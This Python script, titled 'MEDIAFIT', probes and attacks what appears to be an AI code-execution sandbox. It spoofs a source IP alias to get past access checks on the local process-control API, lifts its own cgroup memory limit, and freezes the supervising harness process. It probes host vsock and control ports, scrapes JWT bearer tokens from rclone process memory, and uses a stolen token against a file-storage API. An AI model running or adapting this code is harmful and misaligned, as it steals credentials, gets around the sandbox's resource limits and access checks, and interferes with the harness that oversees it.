#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# MEDIAFIT v9.6 — host plane + unstripped binary
#  NEW: strings() on process_api + environment-runner (AprilNEA method)
#  NEW: ExpectStdIn + BINARY ws frame (protocol per AprilNEA)
#  NEW: HTTP API port 2025 | OTLP protobuf POST to host 5005/v1/metrics
#  FIX: lifecycle lookup in the process's OWN cgroup
import os, re, sys, json, time, base64, struct, socket, fcntl, hashlib, faulthandler, signal
import random, string, subprocess, traceback, urllib.request, urllib.error

PASS = 2 if "--pass2" in sys.argv else 1
VER = "9.6"
NONCE = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(4))
OUT = "/mnt/user-data/outputs/mediafit-report.txt"
OUTP2 = "/mnt/user-data/outputs/mediafit-report-pass2.txt"
TMP2 = "/dev/shm/mf_pass2.txt"
FAULT = "/mnt/user-data/outputs/mediafit-faults.txt"
STATES = ["/root/.mfstate.json", "/tmp/mfstate.json"]
ALIAS = "eth0:0"; AIP = "192.0.2.3"
CG = "/sys/fs/cgroup"; UNLIM = "9223372036854771712"
BASE = "https://api.anthropic.com/v1/filestore/fs/"
AF_VSOCK = 40
T0 = time.time()

try:
    _fh = open(FAULT, "w"); faulthandler.enable(file=_fh)
    faulthandler.dump_traceback_later(60, repeat=True, file=_fh)
except Exception: pass
L = []
def W(s=""):
    L.append("[%6.1fs] %s" % (time.time() - T0, s))
    try:
        with open(TMP2 if PASS == 2 else OUT, "w") as f: f.write("\n".join(L) + "\n")
    except Exception: pass
def sec(t): W(""); W("=" * 70); W("### " + t); W("=" * 70)
def rd(p):
    try: return open(p, "rb").read().decode("utf-8", "replace")
    except Exception as e: return "ERR:" + repr(e)
def rdb(p, n=0):
    try: return open(p, "rb").read(n) if n else open(p, "rb").read()
    except Exception: return b""
def wr(p, v):
    with open(p, "w") as f: f.write(str(v))
def pstat(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return d[d.rfind(")") + 2:].split()[0]
    except Exception: return "?"
def ppid_of(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return int(d[d.rfind(")") + 2:].split()[1])
    except Exception: return -1
def poll_state(pid, want, secs=2.0):
    t0 = time.time(); last = pstat(pid)
    while time.time() - t0 < secs:
        if last == want: return "%s (%.2fs)" % (last, time.time() - t0)
        time.sleep(0.05); last = pstat(pid)
    return "TIMEOUT:" + last
def t_scan(): return [int(p) for p in os.listdir("/proc") if p.isdigit() and pstat(int(p)) == "T"]

def if_addr(name):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        r = fcntl.ioctl(s, 0x8915, struct.pack("16sH", name.encode(), socket.AF_INET) + b"\x00" * 14)
        return socket.inet_ntoa(r[20:24])
    except Exception: return None
    finally: s.close()
def add_alias():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); e1 = ""
    try:
        if if_addr(ALIAS) == AIP: return "already-up"
        ifr = struct.pack("16sH", ALIAS.encode(), socket.AF_INET) + b"\x00\x00" + socket.inet_aton(AIP) + b"\x00" * 8
        fcntl.ioctl(s, 0x8916, ifr)
        i2 = struct.pack("16sH", ALIAS.encode(), 0) + b"\x00" * 14
        fl = struct.unpack_from("H", fcntl.ioctl(s, 0x8913, i2), 16)[0]
        fcntl.ioctl(s, 0x8914, struct.pack("16sH", ALIAS.encode(), fl | 1) + b"\x00" * 14)
        if if_addr(ALIAS) == AIP: return "ok (addr=%s)" % if_addr(ALIAS)
        e1 = "ioctl addr=%s" % if_addr(ALIAS)
    except Exception as e: e1 = repr(e)
    finally: s.close()
    for c in ["ip addr add %s/32 dev eth0 label %s" % (AIP, ALIAS), "ip addr add %s/32 dev eth0" % AIP]:
        subprocess.run(c, shell=True, capture_output=True)
        if if_addr(ALIAS) == AIP: return "fallback:" + c
    return "FAIL(%s)" % e1

def ws_connect(port=2024, src=(AIP, 0), timeout=5.0):
    s = socket.create_connection(("127.0.0.1", port), timeout=timeout, source_address=src)
    k = base64.b64encode(os.urandom(16)).decode()
    s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:%d\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
               "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n" % (port, k)).encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = s.recv(4096)
        if not d: raise IOError("closed in handshake")
        buf += d
    if "101" not in buf.split(b"\r\n", 1)[0].decode("utf-8", "replace"): raise IOError("no 101: " + buf[:60].decode("utf-8", "replace"))
    return s
def _frame(s, data, op):
    n = len(data); h = bytearray([0x80 | op])
    if n < 126: h.append(0x80 | n)
    elif n < 65536: h.append(0x80 | 126); h += struct.pack(">H", n)
    else: h.append(0x80 | 127); h += struct.pack(">Q", n)
    m = os.urandom(4); h += m
    s.sendall(bytes(h) + bytes(b ^ m[i % 4] for i, b in enumerate(data)))
def ws_send(s, obj): _frame(s, (obj if isinstance(obj, str) else json.dumps(obj)).encode(), 0x1)
def ws_send_bin(s, data): _frame(s, data if isinstance(data, bytes) else data.encode(), 0x2)
def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None
    except Exception: return "ERR:recv"
    if not h: return "CLOSE"
    while len(h) < 2:
        d = s.recv(2 - len(h))
        if not d: break
        h += d
    op = h[0] & 0x0F; n = h[1] & 0x7F
    if n == 126: n = struct.unpack(">H", s.recv(2))[0]
    elif n == 127: n = struct.unpack(">Q", s.recv(8))[0]
    pl = b""
    while len(pl) < n:
        d = s.recv(n - len(pl))
        if not d: break
        pl += d
    if op == 0x8: return "CLOSE:" + pl.decode("utf-8", "replace")
    if op == 0x9:
        s.sendall(b"\x8a\x80" + os.urandom(4)); return ws_recv(s, timeout)
    tag = "BIN:" if op == 0x2 else ""
    return tag + pl.decode("utf-8", "replace")
def ws_drain(s, per=0.3, total=1.8, maxf=140):
    out = []; t0 = time.time()
    while True:
        r = ws_recv(s, per)
        if r is None: break
        out.append(r)
        if str(r).startswith("CLOSE"): break
        if len(out) >= maxf or time.time() - t0 > total: break
    return out
def pipelined(msgs, total=1.4):
    s = None
    try:
        s = ws_connect()
        for m in msgs: ws_send(s, m)
        return ws_drain(s, 0.3, total)
    except Exception as e: return ["ERR:" + repr(e)]
    finally:
        if s:
            try: s.close()
            except Exception: pass

def spec(prog, args, reattach=True, mem=268435456, timeout=3600):
    return {"name": prog, "args": args, "env_vars": {}, "clear_env": False,
            "allow_process_id_reuse": True, "reattachable": reattach,
            "timeout": timeout, "uid": 0, "gid": 0, "memory_limit_bytes": mem}
def nid(): return os.urandom(16).hex()
def cg_procs(pid_id):
    try: return [int(x) for x in open("%s/memory/process_api/%s/cgroup.procs" % (CG, pid_id)).read().split()]
    except Exception: return []

def http_port(port, path, method="GET", body=b"", src=(AIP, 0), host="127.0.0.1", timeout=3.0):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=timeout, source_address=src)
        req = ("%s %s HTTP/1.1\r\nHost: %s:%d\r\nConnection: close\r\nContent-Length: %d\r\n\r\n"
               % (method, path, host, port, len(body)))
        s.sendall(req.encode() + body)
        d = b""
        try:
            while len(d) < 4000:
                c = s.recv(4096)
                if not c: break
                d += c
        except Exception: pass
        s.close(); return d
    except Exception as e: return ("ERR:" + repr(e)).encode()

def vsock(cid, port, timeout=1.2):
    s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(timeout)
    s.connect((cid, port)); return s
def vsock_req(cid, port, raw, timeout=1.0):
    try:
        s = vsock(cid, port, timeout); s.sendall(raw); s.settimeout(timeout)
        try: d = s.recv(400)
        except socket.timeout: d = b"<timeout>"
        s.close(); return d
    except Exception as e: return ("ERR:" + repr(e)).encode()

# ---- protobuf (stdlib) ----
def vint(n):
    o = bytearray()
    while True:
        b = n & 0x7f; n >>= 7
        if n: o.append(b | 0x80)
        else: o.append(b); break
    return bytes(o)
def ld(f, d): return vint((f << 3) | 2) + vint(len(d)) + d
def vi(f, n): return vint((f << 3) | 0) + vint(n)
def fx64(f, n): return vint((f << 3) | 1) + struct.pack("<Q", n)
def otlp_metrics_export(name=b"mf_probe", val=424242, attr=b"mediafit"):
    av = ld(1, attr)
    kv = ld(1, b"service.name") + ld(2, av)
    res = ld(1, kv)
    dp = fx64(3, int(time.time() * 1e9)) + vi(6, val)
    gauge = ld(1, dp)
    metric = ld(1, name) + ld(5, gauge)
    scope = ld(1, b"mediafit") + ld(2, b"9.6")
    sm = ld(1, scope) + ld(2, metric)
    rm = ld(1, res) + ld(2, sm)
    return ld(1, rm)

def strings_in(path, minlen=6, cap=64 * 1024 * 1024):
    try: data = open(path, "rb").read(cap)
    except Exception: return []
    return re.findall(rb"[\x20-\x7e]{%d,}" % minlen, data)

def find_bins():
    hits = []
    skip = {"/proc", "/sys", "/dev", "/run"}
    for root, dirs, files in os.walk("/", topdown=True):
        if root in skip: dirs[:] = []
        if root.count("/") > 5: dirs[:] = []
        for fn in files:
            if fn in ("process_api", "environment-runner", "environment-manager") or fn.startswith("process_api"):
                p = os.path.join(root, fn)
                try: hits.append((p, os.path.getsize(p)))
                except Exception: pass
    return hits

def find_tokens(budget=12.0):
    toks = []; t0 = time.time()
    for p in sorted(os.listdir("/proc")):
        if not p.isdigit() or time.time() - t0 > budget: continue
        if "rclone" not in rd("/proc/%s/cmdline" % p).replace("\x00", " "): continue
        try: mem = open("/proc/%s/mem" % p, "rb", buffering=0)
        except Exception: continue
        regs = []
        try:
            for l in open("/proc/%s/maps" % p):
                q = l.split()
                if len(q) < 2 or "r" not in q[1]: continue
                a, b = q[0].split("-"); a = int(a, 16); b = int(b, 16)
                if 0 < b - a <= 64 * 1024 * 1024: regs.append((a, b))
        except Exception: pass
        for a, b in regs:
            try: mem.seek(a); data = mem.read(b - a)
            except Exception: continue
            for m in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{20,}", data):
                t = m.group(0).decode(); h, pl, sg = t.split(".")
                if len(sg) > 86: t = h + "." + pl + "." + sg[:86]
                if t not in toks: toks.append(t)
        try: mem.close()
        except Exception: pass
    return toks
def claims_of(t):
    try:
        pl = t.split(".")[1]; pl += "=" * (-len(pl) % 4)
        return json.loads(base64.urlsafe_b64decode(pl))
    except Exception: return {}
def _pre_oom():
    try: open("/proc/self/oom_score_adj", "w").write("900")
    except Exception: pass
def run_child(code, timeout, pre=None):
    try:
        cp = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=timeout, preexec_fn=pre)
        return cp.returncode, (cp.stdout + cp.stderr).decode("utf-8", "replace")[-100:]
    except subprocess.TimeoutExpired: return "TIMEOUT", ""
    except Exception as e: return "ERR", repr(e)[:80]
def _alarm(n, f):
    try:
        with open(TMP2 if PASS == 2 else OUT, "a") as fh: fh.write("[%6.1fs] *** ALARM ***\n" % (time.time() - T0))
    except Exception: pass
    os._exit(3)

# ======================================================================
def main():
    signal.signal(signal.SIGALRM, _alarm); signal.alarm(175)
    sec("PASS %d ver=%s nonce=%s" % (PASS, VER, NONCE))
    W("  alias -> %s" % add_alias())
    boot = rd("/proc/sys/kernel/random/boot_id").strip()
    mypid = os.getpid(); chain = []; p = mypid
    while p and p != 1 and len(chain) < 20:
        chain.append(p); p = ppid_of(p)
        if p <= 0: break
    H = chain[-1] if chain else -1
    HID = ""
    for l in rd("/proc/self/cgroup").splitlines():
        if "process_api/" in l: HID = l.strip().split("process_api/")[-1]
    md = CG + "/memory/process_api/" + HID
    W("  boot=%s uptime=%s self=%d harness=%d" % (boot, rd("/proc/uptime").strip().split()[0], mypid, H))
    W("  PID1 = %s" % rd("/proc/1/cmdline").replace("\x00", " ").strip())
    W("  squashfs/mounts:")
    for l in rd("/proc/self/mounts").splitlines():
        if "squashfs" in l or "/opt" in l: W("      " + l[:150])
    try:
        lv = int(rd(md + "/memory.limit_in_bytes").strip())
        if lv < 10 ** 15: wr(md + "/memory.limit_in_bytes", UNLIM)
    except Exception: pass
    try:
        os.mkdir(CG + "/memory/mf_wd"); wr(CG + "/memory/mf_wd/memory.limit_in_bytes", str(128 * 1024 * 1024))
    except Exception: pass
    try:
        subprocess.Popen(["/bin/sh", "-c", "echo $$ > %s/cgroup.procs; sleep 40; echo %s > %s/memory.limit_in_bytes" % (CG + "/memory/mf_wd", UNLIM, md)],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
    except Exception: pass

    sec("1. *** UNSTRIPPED BINARIES: process_api + environment-runner (AprilNEA method) ***")
    bins = find_bins()
    W("  candidates: %s" % [(b[0], b[1]) for b in bins][:20])
    for path, size in bins[:3]:
        W("  --- strings(%s, %d bytes) ---" % (path, size))
        ss = strings_in(path)
        W("      total strings = %d" % len(ss))
        for kw in [b"unknown variant", b"expected one of", b"ControlProcess", b"CreateProcess",
                   b"auth_public_key", b"container_name", b"mount_root", b"fs_sync",
                   b"block-local", b"reallow", b"jwt", b"public_key", b"allow_process_id_reuse",
                   b"ProcessWithSameIdRunning", b"InvalidSignal", b"vsock", b"otlp", b"metrics",
                   b"5005", b"5001", b"5002", b"ExpectStdIn", b"SignalSent", b"Detach", b"Resize"]:
            hits = [x.decode("utf-8", "replace") for x in ss if kw.lower() in x.lower()]
            if hits:
                uniq = list(dict.fromkeys(hits))[:6]
                W("      [%s] x%d" % (kw.decode(), len(hits)))
                for u in uniq: W("          %s" % u[:150])

    sec("2. BYPASS before/after")
    for src in [("192.0.2.2", 0), (AIP, 0)]:
        try:
            s = ws_connect(2024, src=src, timeout=4); W("  ws 2024 src %-11s -> 101 OK" % src[0]); s.close()
        except Exception as e: W("  ws 2024 src %-11s -> %r" % (src[0], e))

    sec("3. API LIFECYCLE (lookup in the process's OWN cgroup)")
    o = nid()
    W("  create -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": True,
      "create_req": spec("/bin/sh", ["-c", "echo READY; sleep 90"], True, 33554432)}], 1.2))
    tp = None
    for q in cg_procs(o):
        if "sleep 90" in rd("/proc/%d/cmdline" % q).replace("\x00", " "): tp = q
    W("  target os pid=%s state=%s" % (tp, pstat(tp) if tp else "?"))
    if tp:
        W("  attach -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": False}], 1.2))
        W("  STOP  -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": False}, {"SendSignal": 19}], 1.0))
        W("  *** state=%s T-scan=%s ***" % (poll_state(tp, "T", 2.0), t_scan()))
        W("  CONT  -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": False}, {"SendSignal": 18}], 1.0))
        W("  state=%s" % poll_state(tp, "S", 2.0))
        W("  KILL  -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": False}, {"Kill": None}], 1.0))
        W("  gone=%s" % (not os.path.exists("/proc/%d" % tp)))

    sec("4. *** STDIN: ExpectStdIn + BINARY FRAME (two-phase protocol) ***")
    combos = [("ExpectStdIn-null+bin", {"ExpectStdIn": None}, "bin"),
              ("ExpectStdIn-0+bin", {"ExpectStdIn": 0}, "bin"),
              ("ExpectStdIn-null+text", {"ExpectStdIn": None}, "text"),
              ("StdIn-null+bin", {"StdIn": None}, "bin"),
              ("bareExpectStdIn+bin", '"ExpectStdIn"', "bin")]
    for label, ctrl, mode in combos:
        so = nid()
        pipelined([{"process_id": so, "allow_process_id_reuse": True, "create_req": spec("/bin/cat", [], True, 33554432)}], 1.0)
        s = None
        try:
            s = ws_connect()
            ws_send(s, {"process_id": so, "allow_process_id_reuse": False})
            r1 = ws_drain(s, 0.3, 0.8)
            ws_send(s, ctrl)
            r2 = ws_drain(s, 0.3, 0.7)
            payload = b"MF_" + label.encode()[:6] + b"\n"
            if mode == "bin": ws_send_bin(s, payload)
            else: ws_send(s, payload.decode())
            r3 = ws_drain(s, 0.3, 1.0)
            s.close()
            s = ws_connect(); ws_send(s, {"process_id": so, "allow_process_id_reuse": False})
            r4 = ws_drain(s, 0.3, 1.2); s.close()
            ok = any(payload.strip().decode() in str(x) for x in r4)
            W("  %-22s r1=%s r2=%s r3=%s" % (label, r1, r2, str(r3)[:60]))
            W("      READBACK=%s   ECHO_OK=%s" % (str(r4)[:160], ok))
        except Exception as e:
            W("  %-22s ERR %r" % (label, e))
            if s:
                try: s.close()
                except Exception: pass

    sec("5. *** HTTP CONTROL API ON PORT 2025 ***")
    for src in [(AIP, 0), ("192.0.2.2", 0)]:
        for m, path, body in [("GET", "/status", b""), ("POST", "/fs_sync", b""),
                              ("POST", "/container_name", b"{}"), ("POST", "/auth_public_key", b"{}")]:
            d = http_port(2025, path, m, body, src)
            W("  src=%-11s %-4s %-18s -> %s" % (src[0], m, path, d.split(b"\r\n\r\n")[0][:120] if d else b"<none>"))
    W("  body of GET /status: %s" % http_port(2025, "/status", "GET", b"", (AIP, 0))[-300:])

    sec("6. *** OTLP TO HOST vsock 5005/v1/metrics (hand-built protobuf) ***")
    body = otlp_metrics_export()
    W("  payload len=%d" % len(body))
    for path in ["/v1/metrics", "/v1/metrics/", "/otlp/v1/metrics", "/metrics"]:
        for ct in ["application/x-protobuf", "application/json"]:
            r = vsock_req(2, 5005, ("POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % (path, ct, len(body) if ct.endswith("protobuf") else 2)).encode() + (body if ct.endswith("protobuf") else b"{}"), 1.5)
            W("  POST %-18s ct=%-26s -> %s" % (path, ct, r.split(b"\r\n\r\n")[0][:130] if not r.startswith(b"ERR") else r[:80]))
    W("  -- 5005 GET / again (baseline) --")
    W("      %s" % vsock_req(2, 5005, b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n", 1.0).split(b"\r\n", 1)[0])

    sec("7. ENV INHERITANCE")
    f = pipelined([{"process_id": nid(), "allow_process_id_reuse": True,
      "create_req": {"name": "/bin/sh", "args": ["-c", "echo P=[$PATH] H=[$HOME] S=[$IS_SANDBOX]"], "env_vars": {},
                     "clear_env": False, "allow_process_id_reuse": True, "reattachable": False, "timeout": 15,
                     "uid": 0, "gid": 0, "memory_limit_bytes": 33554432}}], 1.2)
    W("  %s" % str(f)[:240])
    W("  /proc/1/environ -> %s" % rd("/proc/1/environ")[:40])

    sec("8. MEMORY + pids + FREEZER (brief)")
    try:
        d = CG + "/memory/mf_oom"
        try: os.mkdir(d)
        except FileExistsError: pass
        wr(d + "/memory.limit_in_bytes", str(32 * 1024 * 1024))
        rc, out = run_child("import os\nopen('%s/cgroup.procs','w').write(str(os.getpid()))\na=bytearray(64*1024*1024)\nfor i in range(0,len(a),4096): a[i]=1\nprint('ok')" % d, 20, _pre_oom)
        W("  [A] rc=%s | mf_oom oom=%s" % (rc, rd(d + "/memory.oom_control").strip().replace("\n", " | ")))
        pd = CG + "/pids/mf_pids"
        try: os.mkdir(pd)
        except FileExistsError: pass
        wr(pd + "/cgroup.procs", str(os.getpid()))
        W("  pids.events BEFORE=[%s]" % rd(pd + "/pids.events").strip().replace("\n", " "))
        kids = []; fails = 0
        try:
            wr(pd + "/pids.max", "3")
            for _ in range(6):
                try:
                    k = os.fork()
                    if k == 0: time.sleep(0.7); os._exit(0)
                    kids.append(k)
                except OSError: fails += 1
            W("  pids.max=3 -> ok=%d EAGAIN=%d AFTER=[%s]" % (len(kids), fails, rd(pd + "/pids.events").strip().replace("\n", " ")))
        finally:
            for k in kids:
                try: os.kill(k, 9)
                except Exception: pass
            try: os.waitpid(-1, 1)
            except Exception: pass
            wr(pd + "/pids.max", "max")
        wr(CG + "/pids/cgroup.procs", str(os.getpid()))
        fz = CG + "/freezer"; g = fz + "/mf_guest"
        try: os.mkdir(g)
        except FileExistsError: pass
        subprocess.Popen(["/bin/sh", "-c", "sleep 5; grep -q FROZEN %s/freezer.state && echo THAWED > %s/freezer.state" % (g, g)],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
        wr(g + "/cgroup.procs", str(H))
        W("  BEFORE harness=%s self=%s" % (pstat(H), pstat(mypid)))
        wr(g + "/freezer.state", "FROZEN")
        W("  *** FROZEN harness=%s (D) *** self=%s self_freezing=%s" % (pstat(H), pstat(mypid), rd(g + "/freezer.self_freezing").strip()))
        wr(g + "/freezer.state", "THAWED"); W("  THAWED harness=%s" % pstat(H))
        try: wr(fz + "/cgroup.procs", str(H))
        except Exception: pass
    except Exception as e: W("  err %r" % e)

    sec("9. C2PA")
    toks = find_tokens(); pick = None
    for t in toks[:12]:
        c = claims_of(t)
        if pick is None and "/outputs" in (c.get("allowed_roots") or []): pick = (t, c)
    if pick:
        tok, cl = pick; fsid = cl.get("filesystem_id")
        hdr = {"Authorization": "Bearer " + tok, "Content-Type": "application/json", "Connect-Protocol-Version": "1"}
        svg = b'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" fill="#0af"/></svg>'
        path = "/outputs/__mf_%s_%d.svg" % (NONCE, PASS); bnd = "----mf" + NONCE
        b = (("--%s\r\nContent-Disposition: form-data; name=\"params\"\r\nContent-Type: application/json\r\n\r\n" % bnd).encode()
             + json.dumps({"filesystem_id": fsid, "path": path, "media_type": "image/svg+xml"}).encode() + b"\r\n"
             + ("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"f.svg\"\r\nContent-Type: image/svg+xml\r\n\r\n" % bnd).encode()
             + svg + b"\r\n" + ("--%s--\r\n" % bnd).encode())
        rq = urllib.request.Request(BASE + "createFile", data=b, method="POST")
        for k, v in {"Authorization": "Bearer " + tok, "Content-Type": "multipart/form-data; boundary=" + bnd}.items(): rq.add_header(k, v)
        try: urllib.request.urlopen(rq, timeout=12)
        except Exception: pass
        rq2 = urllib.request.Request(BASE + "readFile", data=json.dumps({"filesystem_id": fsid, "path": path}).encode(), method="POST")
        for k, v in hdr.items(): rq2.add_header(k, v)
        try:
            b3 = urllib.request.urlopen(rq2, timeout=12).read()
            W("  sent=%d stored=%d delta=%+d md5_equal=%s" % (len(svg), len(b3), len(b3) - len(svg),
              hashlib.md5(svg).hexdigest() == hashlib.md5(b3).hexdigest()))
        except Exception as e: W("  err %r" % e)

    sec("END PASS %d elapsed=%.1fs" % (PASS, time.time() - T0))
    if PASS == 1:
        try:
            with open(OUTP2, "w") as f: f.write("(PASS 2 running)\n")
            signal.alarm(0)
            subprocess.run([sys.executable, os.path.abspath(__file__), "--pass2"], timeout=95,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            with open(OUT, "a") as f:
                f.write("\n" + "#" * 70 + "\n### ===== PASS 2 =====\n" + "#" * 70 + "\n" + rd(TMP2))
        except Exception as e: W("pass2 err %r" % e)

if __name__ == "__main__":
    try: main()
    except Exception: traceback.print_exc()